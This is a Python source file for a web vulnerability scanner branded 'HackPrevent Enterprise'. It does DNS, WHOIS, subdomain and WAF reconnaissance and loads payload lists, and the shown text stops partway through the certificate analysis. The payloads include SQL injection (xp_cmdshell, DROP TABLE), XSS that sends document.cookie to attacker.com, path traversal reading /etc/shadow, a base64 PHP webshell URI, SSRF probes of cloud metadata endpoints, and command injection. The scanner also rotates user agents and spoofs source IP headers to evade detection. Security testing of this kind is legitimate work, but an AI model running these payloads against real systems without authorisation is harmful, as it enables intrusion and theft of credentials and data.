#!/usr/bin/env python3
"""
HackPrevent Enterprise Web Vulnerability Scanner v2.0
Advanced Professional Security Analysis Platform
Author: Javier Bogado - HackPrevent
Date: 2025-09-03
License: Enterprise Grade Security Tool
"""

import requests
import ssl
import socket
import json
import time
import threading
import subprocess
import sys
import os
import re
import random
import base64
import hashlib
import urllib.parse
from urllib.parse import urljoin, urlparse, parse_qs, quote
from datetime import datetime, timedelta
import argparse
import warnings
from concurrent.futures import ThreadPoolExecutor, as_completed
import platform
import itertools
import xml.etree.ElementTree as ET
from pathlib import Path

# Advanced imports for enterprise features
try:
    import dns.resolver
    import whois
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    DNS_AVAILABLE = True
    SELENIUM_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False
    SELENIUM_AVAILABLE = False

# Suppress warnings
warnings.filterwarnings('ignore', message='Unverified HTTPS request')
warnings.filterwarnings('ignore', category=DeprecationWarning)

try:
    from bs4 import BeautifulSoup
    from colorama import init, Fore, Back, Style
    from tqdm import tqdm
    import yaml
except ImportError:
    print("🚀 Installing required enterprise dependencies...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", 
                          "beautifulsoup4", "colorama", "tqdm", "requests", 
                          "pyyaml", "dnspython", "python-whois", "selenium"])
    from bs4 import BeautifulSoup
    from colorama import init, Fore, Back, Style
    from tqdm import tqdm
    import yaml

init(autoreset=True)

class EnterpriseWebVulnScanner:
    """Enterprise-Grade Web Vulnerability Scanner with Advanced Detection"""
    
    def __init__(self, target_url, threads=15, aggressive=False, deep_scan=False):
        self.target_url = target_url.rstrip('/')
        self.domain = urlparse(target_url).netloc
        self.base_domain = self.extract_base_domain(self.domain)
        self.threads = threads
        self.aggressive = aggressive
        self.deep_scan = deep_scan
        self.session = requests.Session()
        
        # Advanced session configuration
        self.setup_advanced_session()
        
        # Enterprise data structures
        self.vulnerabilities = []
        self.discovered_endpoints = set()
        self.discovered_parameters = set()
        self.forms_data = []
        self.cookies_analysis = {}
        self.waf_detected = False
        self.waf_type = None
        
        # Scan results structure
        self.scan_results = {
            'metadata': {
                'target': target_url,
                'scan_date': datetime.now().isoformat(),
                'scanner_version': 'HackPrevent Enterprise v2.0',
                'scan_type': 'deep' if deep_scan else 'standard',
                'aggressive_mode': aggressive,
                'scanner_os': f"{platform.system()} {platform.release()}",
                'operator': 'jbogad'
            },
            'reconnaissance': {
                'dns_analysis': {},
                'whois_data': {},
                'subdomain_enumeration': [],
                'technology_fingerprinting': {},
                'waf_detection': {}
            },
            'infrastructure_analysis': {
                'ssl_analysis': {},
                'security_headers': {},
                'server_analysis': {},
                'port_scan_results': {}
            },
            'application_security': {
                'injection_vulnerabilities': [],
                'xss_vulnerabilities': [],
                'authentication_issues': [],
                'authorization_flaws': [],
                'session_management': {},
                'file_inclusion_vulns': [],
                'business_logic_flaws': []
            },
            'advanced_testing': {
                'api_security': {},
                'client_side_security': {},
                'websocket_analysis': {},
                'graphql_testing': {}
            },
            'risk_assessment': {
                'overall_risk_score': 0,
                'compliance_status': {},
                'executive_summary': {},
                'remediation_roadmap': []
            }
        }
        
        # Load payloads and wordlists
        self.load_payloads()
    
    def extract_base_domain(self, domain):
        """Extract base domain from subdomain"""
        parts = domain.split('.')
        if len(parts) >= 2:
            return '.'.join(parts[-2:])
        return domain
    
    def setup_advanced_session(self):
        """Configure advanced session with evasion techniques"""
        # Rotating User-Agents for evasion
        self.user_agents = [
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0'
        ]
        
        self.session.headers.update({
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Cache-Control': 'max-age=0'
        })
        
        # Advanced session configuration
        self.session.max_redirects = 10
        self.session.verify = False
        
        # Custom adapter for retry logic
        from requests.adapters import HTTPAdapter
        from urllib3.util.retry import Retry
        
        retry_strategy = Retry(
            total=3,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
    
    def load_payloads(self):
        """Load comprehensive payload databases"""
        # SQL Injection payloads
        self.sql_payloads = [
            "'", "''", "\"", "\"\"", "`", "``",
            "' OR '1'='1", "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
            "admin'--", "admin'#", "admin'/*", "') OR ('1'='1",
            "1' UNION SELECT NULL--", "1' UNION SELECT 1,2,3--",
            "'; EXEC xp_cmdshell('dir')--", "'; EXEC sp_configure 'show advanced options', 1--",
            "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "1' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
            "1' WAITFOR DELAY '0:0:5'--", "1'; WAITFOR DELAY '0:0:5'--",
            "1' OR SLEEP(5)--", "1' OR pg_sleep(5)--",
            "1'||UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))||'",
            "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))--"
        ]
        
        # XSS payloads
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<script>alert(document.domain)</script>",
            "<script>alert(document.cookie)</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "'\"><script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>",
            "<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>",
            "<script>new Image().src='http://attacker.com/steal?cookie='+document.cookie</script>",
            "';alert('XSS');//", "\";alert('XSS');//",
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>"
        ]
        
        # LFI/Path Traversal payloads
        self.lfi_payloads = [
            "../../../etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "/etc/passwd", "/etc/shadow", "/etc/hosts", "/etc/group",
            "/proc/version", "/proc/self/environ", "/proc/self/cmdline",
            "....//....//....//etc/passwd", "..%2f..%2f..%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd", "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "php://filter/read=convert.base64-encode/resource=../../../etc/passwd",
            "file:///etc/passwd", "file://c:/windows/system32/drivers/etc/hosts",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2B",
            "expect://id", "zip://test.zip%23shell.php", "phar://test.phar/shell.php"
        ]
        
        # SSRF payloads
        self.ssrf_payloads = [
            "http://localhost", "http://127.0.0.1", "http://0.0.0.0",
            "http://[::1]", "http://localhost:22", "http://localhost:3306",
            "http://169.254.169.254/latest/meta-data/", "http://metadata.google.internal/",
            "file:///etc/passwd", "file://c:/windows/system32/drivers/etc/hosts",
            "gopher://127.0.0.1:25/", "dict://127.0.0.1:11211/",
            "ldap://127.0.0.1", "sftp://127.0.0.1"
        ]
        
        # Command Injection payloads
        self.command_payloads = [
            "; id;", "| id", "& id &", "&& id", "|| id",
            "; cat /etc/passwd;", "| cat /etc/passwd", "& cat /etc/passwd &",
            "; ping -c 4 127.0.0.1;", "| ping -c 4 127.0.0.1", 
            "; sleep 5;", "| sleep 5", "& sleep 5 &",
            "`id`", "$(id)", "${id}", "$[id]",
            "%0aid", "%0a%0did", "%0d%0aid", "%0d%0a%0did"
        ]
        
        # Directory/file wordlists
        self.directory_wordlist = [
            # Admin panels
            'admin', 'administrator', 'wp-admin', 'adminpanel', 'control', 'cpanel',
            'manager', 'management', 'moderator', 'webadmin', 'adminarea', 'bb-admin',
            'adminLogin', 'admin_area', 'panel-administracion', 'instadmin',
            
            # Configuration files
            'config', 'configuration', 'settings', 'setup', 'install', 'installation',
            '.env', '.config', 'config.php', 'config.json', 'web.config', 'app.config',
            'database.yml', 'secrets.yml', 'parameters.yml', 'config.yml',
            
            # Backup files
            'backup', 'backups', 'bak', 'old', 'orig', 'copy', 'archive',
            'backup.sql', 'database.sql', 'dump.sql', 'backup.tar.gz',
            'backup.zip', 'site-backup.zip', 'db_backup.sql',
            
            # Development/Testing
            'test', 'testing', 'dev', 'development', 'staging', 'demo',
            'beta', 'alpha', 'qa', 'uat', 'preprod', 'preview',
            'sandbox', 'pilot', 'experimental',
            
            # Version control
            '.git', '.svn', '.hg', '.bzr', 'CVS', '.git/config', '.git/HEAD',
            '.git/logs/HEAD', '.svn/entries', '.svn/wc.db',
            
            # API endpoints
            'api', 'api/v1', 'api/v2', 'rest', 'restapi', 'webservice',
            'ws', 'service', 'services', 'graphql', 'apollo',
            
            # File uploads
            'upload', 'uploads', 'files', 'file', 'documents', 'docs',
            'images', 'img', 'pictures', 'pics', 'assets', 'static',
            'media', 'attachments', 'download', 'downloads',
            
            # Logs and monitoring
            'logs', 'log', 'access.log', 'error.log', 'debug.log',
            'app.log', 'application.log', 'system.log', 'audit.log',
            'phpmyadmin', 'pma', 'mysql', 'adminer', 'phpinfo.php',
            
            # Common files
            'robots.txt', 'sitemap.xml', 'crossdomain.xml', 'clientaccesspolicy.xml',
            'humans.txt', 'security.txt', '.well-known', '.well-known/security.txt',
            'favicon.ico', 'apple-touch-icon.png', 'browserconfig.xml',
            
            # CMS specific
            'wp-content', 'wp-includes', 'wp-config.php', 'xmlrpc.php',
            'wp-json', 'readme.html', 'license.txt', 'changelog.txt'
        ]
    
    def rotate_user_agent(self):
        """Rotate User-Agent for evasion"""
        self.session.headers['User-Agent'] = random.choice(self.user_agents)
    
    def add_random_headers(self):
        """Add random headers for evasion"""
        headers = {}
        if random.choice([True, False]):
            headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        if random.choice([True, False]):
            headers['X-Real-IP'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        if random.choice([True, False]):
            headers['X-Originating-IP'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        return headers
    
    def print_enterprise_banner(self):
        """Display enterprise scanner banner"""
        banner = f"""
{Fore.CYAN}╭{'━' * 80}╮
{Fore.CYAN}┃{Fore.YELLOW}  🛡️  HACKPREVENT ENTERPRISE SECURITY SCANNER v2.0{' ' * 25}┃
{Fore.CYAN}┃{Fore.GREEN}     Advanced Professional Vulnerability Assessment Platform{' ' * 18}┃
{Fore.CYAN}┃{' ' * 80}┃
{Fore.CYAN}┃{Fore.WHITE}  🎯 Target: {self.target_url:<60}┃
{Fore.CYAN}┃{Fore.WHITE}  🔍 Scan Type: {'Deep Scan' if self.deep_scan else 'Standard Scan':<55}┃
{Fore.CYAN}┃{Fore.WHITE}  ⚡ Mode: {'Aggressive' if self.aggressive else 'Stealth':<63}┃
{Fore.CYAN}┃{Fore.WHITE}  👤 Operator: jbogad{' ' * 57}┃
{Fore.CYAN}┃{Fore.WHITE}  📅 Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC'):<64}┃
{Fore.CYAN}┃{Fore.WHITE}  🖥️  System: {platform.system()} {platform.release():<55}┃
{Fore.CYAN}╰{'━' * 80}╯{Style.RESET_ALL}
        """
        print(banner)
    
    def log_vulnerability(self, category, vuln_type, severity, description, evidence="", 
                         recommendation="", cve_reference="", owasp_category=""):
        """Enhanced vulnerability logging with enterprise details"""
        vuln = {
            'id': f"HP-{len(self.vulnerabilities)+1:04d}",
            'category': category,
            'type': vuln_type,
            'severity': severity,
            'description': description,
            'evidence': evidence,
            'recommendation': recommendation,
            'cve_reference': cve_reference,
            'owasp_category': owasp_category,
            'timestamp': datetime.now().isoformat(),
            'confidence': self.calculate_confidence(evidence),
            'exploitability': self.assess_exploitability(vuln_type, evidence)
        }
        self.vulnerabilities.append(vuln)
        
        # Enhanced console output
        severity_emoji = {
            'CRITICAL': '🔴',
            'HIGH': '🟠', 
            'MEDIUM': '🟡',
            'LOW': '🔵',
            'INFO': '⚪'
        }
        
        color_map = {
            'CRITICAL': Fore.RED + Style.BRIGHT,
            'HIGH': Fore.RED,
            'MEDIUM': Fore.YELLOW,
            'LOW': Fore.CYAN,
            'INFO': Fore.WHITE
        }
        
        emoji = severity_emoji.get(severity, '⚪')
        color = color_map.get(severity, Fore.WHITE)
        
        print(f"{color}{emoji} [HP-{len(self.vulnerabilities):04d}] [{severity}] {category} - {vuln_type}")
        print(f"   📝 {description}")
        if evidence:
            print(f"   🔍 Evidence: {evidence[:100]}...")
        if cve_reference:
            print(f"   🆔 CVE: {cve_reference}")
        print(f"{Style.RESET_ALL}")
    
    def calculate_confidence(self, evidence):
        """Calculate confidence level based on evidence"""
        if not evidence:
            return "LOW"
        if len(evidence) > 100 and any(keyword in evidence.lower() for keyword in ['error', 'exception', 'stack trace', 'syntax']):
            return "HIGH"
        if len(evidence) > 50:
            return "MEDIUM"
        return "LOW"
    
    def assess_exploitability(self, vuln_type, evidence):
        """Assess exploitability level"""
        high_exploitability = ['SQL Injection', 'Command Injection', 'File Upload', 'RCE']
        medium_exploitability = ['XSS', 'CSRF', 'LFI', 'SSRF']
        
        if any(high_type in vuln_type for high_type in high_exploitability):
            return "HIGH"
        elif any(medium_type in vuln_type for medium_type in medium_exploitability):
            return "MEDIUM"
        else:
            return "LOW"
    
    def advanced_reconnaissance(self):
        """Comprehensive reconnaissance phase"""
        print(f"\n{Fore.BLUE}🕵️  Starting Advanced Reconnaissance...{Style.RESET_ALL}")
        
        # DNS Analysis
        self.dns_analysis()
        
        # WHOIS Lookup
        self.whois_analysis()
        
        # Subdomain Enumeration
        self.subdomain_enumeration()
        
        # Technology Fingerprinting
        self.advanced_fingerprinting()
        
        # WAF Detection
        self.waf_detection()
    
    def dns_analysis(self):
        """Advanced DNS analysis"""
        if not DNS_AVAILABLE:
            return
        
        print(f"{Fore.CYAN}🌐 Performing DNS analysis...{Style.RESET_ALL}")
        
        dns_results = {}
        record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA']
        
        try:
            for record_type in record_types:
                try:
                    answers = dns.resolver.resolve(self.domain, record_type)
                    dns_results[record_type] = [str(answer) for answer in answers]
                    print(f"  {record_type}: {', '.join(dns_results[record_type][:3])}")
                except Exception:
                    dns_results[record_type] = []
            
            # Check for zone transfer vulnerability
            try:
                ns_servers = dns_results.get('NS', [])
                for ns in ns_servers[:2]:  # Check first 2 NS servers
                    try:
                        zone = dns.zone.from_xfr(dns.query.xfr(ns, self.domain))
                        if zone:
                            self.log_vulnerability("DNS Security", "Zone Transfer", "HIGH",
                                                 f"DNS Zone Transfer possible on {ns}",
                                                 f"NS Server: {ns}",
                                                 "Restrict zone transfer to authorized servers",
                                                 "", "A9:2017-Security Misconfiguration")
                    except Exception:
                        pass
            except Exception:
                pass
            
            self.scan_results['reconnaissance']['dns_analysis'] = dns_results
            
        except Exception as e:
            print(f"  ⚠️  DNS analysis failed: {str(e)}")
    
    def whois_analysis(self):
        """WHOIS information gathering"""
        try:
            print(f"{Fore.CYAN}📋 Gathering WHOIS information...{Style.RESET_ALL}")
            
            import whois as whois_module
            w = whois_module.whois(self.domain)
            
            whois_data = {
                'domain_name': getattr(w, 'domain_name', 'Unknown'),
                'registrar': getattr(w, 'registrar', 'Unknown'),
                'creation_date': str(getattr(w, 'creation_date', 'Unknown')),
                'expiration_date': str(getattr(w, 'expiration_date', 'Unknown')),
                'name_servers': getattr(w, 'name_servers', []),
                'org': getattr(w, 'org', 'Unknown'),
                'country': getattr(w, 'country', 'Unknown')
            }
            
            # Check for domain expiration
            if hasattr(w, 'expiration_date') and w.expiration_date:
                exp_date = w.expiration_date
                if isinstance(exp_date, list):
                    exp_date = exp_date[0]
                
                if isinstance(exp_date, datetime):
                    days_until_expiry = (exp_date - datetime.now()).days
                    if days_until_expiry < 90:
                        self.log_vulnerability("Domain Management", "Domain Expiration", "MEDIUM",
                                             f"Domain expires in {days_until_expiry} days",
                                             f"Expiration: {exp_date}",
                                             "Renew domain registration before expiration")
            
            self.scan_results['reconnaissance']['whois_data'] = whois_data
            print(f"  🏢 Organization: {whois_data['org']}")
            print(f"  📅 Expires: {whois_data['expiration_date']}")
            
        except Exception as e:
            print(f"  ⚠️  WHOIS lookup failed: {str(e)}")
    
    def subdomain_enumeration(self):
        """Advanced subdomain enumeration"""
        print(f"{Fore.CYAN}🔍 Enumerating subdomains...{Style.RESET_ALL}")
        
        subdomains = []
        common_subdomains = [
            'www', 'mail', 'ftp', 'admin', 'api', 'dev', 'test', 'staging',
            'blog', 'shop', 'store', 'support', 'help', 'docs', 'portal',
            'dashboard', 'panel', 'secure', 'vpn', 'remote', 'backup',
            'old', 'new', 'beta', 'alpha', 'demo', 'sandbox', 'mobile',
            'app', 'apps', 'service', 'services', 'webmail', 'email',
            'pop', 'imap', 'smtp', 'ns1', 'ns2', 'dns', 'mx', 'mx1', 'mx2'
        ]
        
        def check_subdomain(subdomain):
            try:
                full_domain = f"{subdomain}.{self.base_domain}"
                response = self.session.get(f"http://{full_domain}", timeout=5, verify=False)
                if response.status_code != 404:
                    return full_domain
            except Exception:
                pass
            return None
        
        with ThreadPoolExecutor(max_workers=20) as executor:
            future_to_subdomain = {executor.submit(check_subdomain, sub): sub for sub in common_subdomains}
            
            for future in as_completed(future_to_subdomain):
                result = future.result()
                if result:
                    subdomains.append(result)
                    print(f"  ✅ Found: {result}")
        
        self.scan_results['reconnaissance']['subdomain_enumeration'] = subdomains
        
        if len(subdomains) > 10:
            self.log_vulnerability("Information Disclosure", "Subdomain Enumeration", "INFO",
                                 f"Large number of subdomains discovered: {len(subdomains)}",
                                 f"Subdomains: {', '.join(subdomains[:5])}...",
                                 "Review subdomain exposure and implement proper access controls")
    
    def advanced_fingerprinting(self):
        """Advanced technology fingerprinting"""
        print(f"{Fore.CYAN}🔧 Advanced technology fingerprinting...{Style.RESET_ALL}")
        
        try:
            self.rotate_user_agent()
            response = self.session.get(self.target_url, timeout=15, verify=False)
            
            technologies = {
                'web_server': self.detect_web_server(response),
                'cms': self.detect_cms(response),
                'frameworks': self.detect_frameworks(response),
                'languages': self.detect_languages(response),
                'databases': self.detect_databases(response),
                'cdn': self.detect_cdn(response),
                'analytics': self.detect_analytics(response),
                'security_products': self.detect_security_products(response)
            }
            
            self.scan_results['reconnaissance']['technology_fingerprinting'] = technologies
            
            # Print findings
            for category, items in technologies.items():
                if items:
                    print(f"  🔧 {category.replace('_', ' ').title()}: {', '.join(items)}")
            
        except Exception as e:
            print(f"  ⚠️  Fingerprinting failed: {str(e)}")
    
    def detect_web_server(self, response):
        """Detect web server technology"""
        servers = []
        server_header = response.headers.get('Server', '').lower()
        
        server_signatures = {
            'apache': ['apache'],
            'nginx': ['nginx'],
            'iis': ['microsoft-iis', 'iis'],
            'lighttpd': ['lighttpd'],
            'tomcat': ['tomcat'],
            'jetty': ['jetty'],
            'cloudflare': ['cloudflare'],
            'aws': ['aws', 'amazon']
        }
        
        for server_type, signatures in server_signatures.items():
            if any(sig in server_header for sig in signatures):
                servers.append(server_type)
        
        return servers
    
    def detect_cms(self, response):
        """Detect Content Management Systems"""
        cms_list = []
        content = response.text.lower()
        headers = {k.lower(): v.lower() for k, v in response.headers.items()}
        
        cms_signatures = {
            'wordpress': ['/wp-content/', '/wp-includes/', 'wp-json', 'wordpress'],
            'drupal': ['/sites/default/', '/modules/', '/themes/', 'drupal'],
            'joomla': ['/administrator/', '/components/', '/templates/', 'joomla'],
            'magento': ['/skin/frontend/', '/js/mage/', 'magento'],
            'prestashop': ['/modules/prestashop/', 'prestashop'],
            'shopify': ['shopify', 'myshopify.com'],
            'typo3': ['typo3', '/typo3/'],
            'concrete5': ['concrete5', '/concrete/'],
            'modx': ['modx', '/manager/'],
            'umbraco': ['umbraco', '/umbraco/']
        }
        
        for cms, signatures in cms_signatures.items():
            if any(sig in content for sig in signatures):
                cms_list.append(cms)
        
        return cms_list
    
    def detect_frameworks(self, response):
        """Detect web frameworks"""
        frameworks = []
        content = response.text.lower()
        headers = {k.lower(): v.lower() for k, v in response.headers.items()}
        
        framework_signatures = {
            'react': ['react', '_react', 'reactjs'],
            'angular': ['angular', 'ng-', 'angularjs'],
            'vue': ['vue.js', 'vue', '_vue'],
            'jquery': ['jquery', 'jquery.min.js'],
            'bootstrap': ['bootstrap', 'bootstrap.min.css'],
            'django': ['django', 'csrftoken'],
            'flask': ['flask'],
            'express': ['express'],
            'laravel': ['laravel', 'laravel_session'],
            'codeigniter': ['codeigniter'],
            'symfony': ['symfony'],
            'spring': ['spring', 'jsessionid'],
            'asp.net': ['asp.net', '__viewstate', '__eventvalidation']
        }
        
        for framework, signatures in framework_signatures.items():
            if any(sig in content for sig in signatures):
                frameworks.append(framework)
        
        # Check for framework-specific headers
        if 'x-powered-by' in headers:
            powered_by = headers['x-powered-by']
            if 'asp.net' in powered_by:
                frameworks.append('asp.net')
            elif 'php' in powered_by:
                frameworks.append('php')
        
        return frameworks
    
    def detect_languages(self, response):
        """Detect programming languages"""
        languages = []
        headers = {k.lower(): v.lower() for k, v in response.headers.items()}
        content = response.text.lower()
        
        # Check headers
        if 'x-powered-by' in headers:
            powered_by = headers['x-powered-by']
            if 'php' in powered_by:
                languages.append(f"PHP ({powered_by})")
            elif 'asp.net' in powered_by:
                languages.append("ASP.NET")
        
        # Check file extensions in URLs
        if '.php' in content:
            languages.append('PHP')
        if '.asp' in content or '.aspx' in content:
            languages.append('ASP.NET')
        if '.jsp' in content:
            languages.append('Java (JSP)')
        if '.py' in content:
            languages.append('Python')
        
        return languages
    
    def detect_databases(self, response):
        """Detect database technologies"""
        databases = []
        content = response.text.lower()
        
        db_signatures = {
            'mysql': ['mysql', 'phpmyadmin'],
            'postgresql': ['postgresql', 'postgres'],
            'mongodb': ['mongodb', 'mongo'],
            'oracle': ['oracle', 'ora-'],
            'mssql': ['microsoft sql server', 'mssql'],
            'sqlite': ['sqlite'],
            'redis': ['redis'],
            'elasticsearch': ['elasticsearch', 'elastic']
        }
        
        for db, signatures in db_signatures.items():
            if any(sig in content for sig in signatures):
                databases.append(db)
        
        return databases
    
    def detect_cdn(self, response):
        """Detect CDN services"""
        cdns = []
        headers = {k.lower(): v.lower() for k, v in response.headers.items()}
        
        cdn_signatures = {
            'cloudflare': ['cf-ray', 'cloudflare'],
            'aws_cloudfront': ['cloudfront', 'x-amz-cf-id'],
            'fastly': ['fastly'],
            'akamai': ['akamai'],
            'maxcdn': ['maxcdn'],
            'keycdn': ['keycdn'],
            'jsdelivr': ['jsdelivr'],
            'cdnjs': ['cdnjs']
        }
        
        for cdn, signatures in cdn_signatures.items():
            if any(sig in str(headers.values()).lower() for sig in signatures):
                cdns.append(cdn)
        
        return cdns
    
    def detect_analytics(self, response):
        """Detect analytics and tracking services"""
        analytics = []
        content = response.text.lower()
        
        analytics_signatures = {
            'google_analytics': ['google-analytics', 'gtag', 'ga('],
            'facebook_pixel': ['facebook pixel', 'fbq('],
            'hotjar': ['hotjar'],
            'mixpanel': ['mixpanel'],
            'segment': ['segment'],
            'adobe_analytics': ['adobe analytics', 's_code'],
            'piwik': ['piwik', 'matomo'],
            'yandex_metrica': ['yandex.metrica']
        }
        
        for service, signatures in analytics_signatures.items():
            if any(sig in content for sig in signatures):
                analytics.append(service)
        
        return analytics
    
    def detect_security_products(self, response):
        """Detect security products and WAFs"""
        security_products = []
        headers = {k.lower(): v.lower() for k, v in response.headers.items()}
        
        waf_signatures = {
            'cloudflare': ['cf-ray', 'cloudflare'],
            'akamai': ['akamai'],
            'incapsula': ['incap_ses', 'incapsula'],
            'sucuri': ['sucuri', 'x-sucuri'],
            'mod_security': ['mod_security'],
            'barracuda': ['barracuda'],
            'f5_big_ip': ['f5-bigip', 'bigip'],
            'aws_waf': ['awswaf'],
            'fortinet': ['fortinet']
        }
        
        for waf, signatures in waf_signatures.items():
            if any(sig in str(headers.values()).lower() for sig in signatures):
                security_products.append(waf)
                self.waf_detected = True
                self.waf_type = waf
        
        return security_products
    
    def waf_detection(self):
        """Advanced WAF detection and bypass testing"""
        print(f"{Fore.CYAN}🛡️  Testing for Web Application Firewall...{Style.RESET_ALL}")
        
        waf_payloads = [
            "' OR 1=1--",
            "<script>alert('test')</script>",
            "../../../../etc/passwd",
            "'; DROP TABLE users;--",
            "{{7*7}}",
            "${7*7}",
            "<img src=x onerror=alert(1)>"
        ]
        
        waf_detected = False
        waf_responses = []
        
        for payload in waf_payloads:
            try:
                self.rotate_user_agent()
                test_url = f"{self.target_url}?test={quote(payload)}"
                response = self.session.get(test_url, timeout=10, verify=False)
                
                # Check for WAF indicators
                waf_indicators = [
                    'blocked', 'forbidden', 'not acceptable', 'security',
                    'firewall', 'protection', 'cloudflare', 'incapsula',
                    'sucuri', 'mod_security', 'blocked by', 'access denied'
                ]
                
                response_text = response.text.lower()
                if (response.status_code in [403, 406, 429, 501, 503] or 
                    any(indicator in response_text for indicator in waf_indicators)):
                    waf_detected = True
                    waf_responses.append({
                        'payload': payload,
                        'status_code': response.status_code,
                        'response_length': len(response.content)
                    })
                
            except Exception:
                pass
        
        if waf_detected:
            self.waf_detected = True
            self.log_vulnerability("Security Controls", "WAF Detection", "INFO",
                                 "Web Application Firewall detected",
                                 f"WAF responses: {len(waf_responses)}",
                                 "Implement bypass techniques for comprehensive testing")
            print(f"  🛡️  WAF detected - {len(waf_responses)} blocked requests")
        else:
            print(f"  ❌ No WAF detected")
        
        self.scan_results['reconnaissance']['waf_detection'] = {
            'detected': waf_detected,
            'blocked_requests': len(waf_responses),
            'responses': waf_responses
        }
    
    def comprehensive_infrastructure_analysis(self):
        """Enhanced infrastructure security analysis"""
        print(f"\n{Fore.BLUE}🏗️  Comprehensive Infrastructure Analysis...{Style.RESET_ALL}")
        
        # Enhanced SSL/TLS Analysis
        self.advanced_ssl_analysis()
        
        # Security Headers Analysis
        self.comprehensive_security_headers()
        
        # Server Analysis
        self.server_security_analysis()
        
        # Port Scanning (if aggressive mode)
        if self.aggressive:
            self.port_scanning()
    
    def advanced_ssl_analysis(self):
        """Advanced SSL/TLS security analysis"""
        print(f"{Fore.CYAN}🔒 Advanced SSL/TLS analysis...{Style.RESET_ALL}")
        
        try:
            hostname = urlparse(self.target_url).netloc
            port = 443
            
            # Create SSL context for testing
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            # Test different SSL/TLS versions
            ssl_versions = [
                ('SSLv2', ssl.PROTOCOL_SSLv23),
                ('SSLv3', ssl.PROTOCOL_SSLv23),
                ('TLSv1.0', ssl.PROTOCOL_TLSv1),
                ('TLSv1.1', ssl.PROTOCOL_TLSv1_1),
                ('TLSv1.2', ssl.PROTOCOL_TLSv1_2)
            ]
            
            supported_versions = []
            
            with socket.create_connection((hostname, port), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    protocol = ssock.version()
                    cipher = ssock.cipher()
                    
                    # Certificate analysis
                    if cert:
                        cert_analysis = self.analyze_certificate(cert)
                        
                        # Check certificate chain
                        chain_issues = self.check_certificate_chain(hostname, port)
                        
                        # Check for weak cipher suites
                        weak_ciphers = self.check_weak_ciphers(cipher)
                        
                        ssl_results = {
                            'protocol': protocol,
                            'cipher_suite': cipher,
                            'certificate_analysis': cert_analysis,
                            'chain_issues': chain_issues,
                            'weak_ciphers': weak_ciphers,
                            'supported_versions': supported_versions
                        }
                        
                        self.scan_results['infrastructure_analysis']['ssl_analysis'] = ssl_results
                        
                        print(f"  ✅ Protocol: {protocol}")
                        print(f"  ✅ Cipher: {cipher[0] if cipher else 'Unknown'}")
                        print(f"  📋 Certificate expires: {cert_analysis.get('expiry_date', 'Unknown')}")
        
        except Exception as e:
            self.log_vulnerability("SSL Analysis", "SSL Configuration", "LOW", 
                                 f"SSL analysis failed: {str(e)}")
    
    def analyze_certificate(self, cert):
        """Detailed certificate analysis"""
        analysis = {}
        
        try:
            # Basic certificate info
            analysis['subject'] = dict(x[0] for x in cert.get('subject', []))
            analysis['issuer'] = dict(x[0] for x in cert.get('issuer', []))
            analysis['serial_number'] = cert.get('serialNumber', 'Unknown')
            analysis['version'] = cert.get('version', 'Unknown')
            
            # Validity period
            not_before = cert.get('notBefore')
            not_after = cert.get('notAfter')
            
            if not_after:
                expiry_date = datetime.strptime(not_after, '%b %d %H:%M:%S %Y %Z')
                analysis['expiry_date'] = not_after
